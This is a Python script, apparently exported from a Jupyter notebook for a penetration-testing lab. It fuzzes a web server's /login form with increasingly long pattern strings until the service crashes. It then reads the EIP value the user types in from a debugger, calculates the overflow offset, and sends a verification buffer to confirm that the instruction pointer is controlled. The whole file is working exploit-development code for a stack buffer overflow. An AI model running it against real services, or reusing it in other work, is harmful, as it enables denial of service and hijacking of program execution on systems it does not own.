#!/usr/bin/env python
# coding: utf-8

# In[6]:


import socket
import string
import random
import time
import subprocess

characters  = string.printable[:62]
host        = '192.168.119.192'
target_host = '192.168.192.10'
port        = 80
size        = 100
buffer_str  = ''
maxload     = int(input('type max load size ex: 2000\n'))


# In[7]:


def payload_gen(p,s):
    while len(p) < s:
        four_random_bytes=''.join(random.choices(characters,k=4))
        if four_random_bytes not in p:
            p+=four_random_bytes
    return(p)


# In[8]:


def header_maker(p):
    main_header="""POST /login HTTP/1.1\r
Host: {0}\r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.5\r
Accept-Encoding: gzip, deflate\r
Referer: http://{0}/login\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {1}\r
Connection: keep-alive\r
Upgrade-Insecure-Requests: 1\r\n\r\n""".format(target_host,len(bytes(p,'utf-8')))
    main_header+=p
    
    return bytes(main_header,'utf-8')


# In[ ]:


while size<maxload:
    time.sleep(.5)
    print("\nSending evil buffer...{}".format(size))
    
    buffer_str = payload_gen(buffer_str,size)
    
    payload = "username={}&password=A".format(buffer_str)
    
    b_header=header_maker(payload)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_host,port))
        s.send(b_header)
    
        response=str(s.recv(1024),'utf-8')
        print(response)
        s.close
    except:
        n=subprocess.call('clear')
        print('!!!application crashed!!!')
        
        hex_num=input('look at debugger and type the hex numbers for "EIP" register\n')
        
        section=bytes.fromhex(hex_num).decode('utf-8')[::-1]  #due to little indian format
        start=buffer_str.index(section)
        
        input('EIP starts at {}\n press enter to continue'.format(start))
        
        filler=buffer_str[:start]
        eip="A"*4
        offset="C"*4
        buffer="D"*(1500-len(filler)-len(eip)-len(offset))
        
        buffer_str=filler+eip+offset+buffer
        
        new_payload = "username={}&password=A".format(buffer_str)
        new_header=header_maker(new_payload)
        input('restart the service to verify')
        input('when ready press enter to send verification payload')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host,port))
        s.send(new_header)
        s.close
        print('if EIP  is "41414141" and the ESP is all "D"s you can continue to the next step\nelse continue to troubleshoot')
        
        break
        
    size+=100
    
print( "\nDone!")

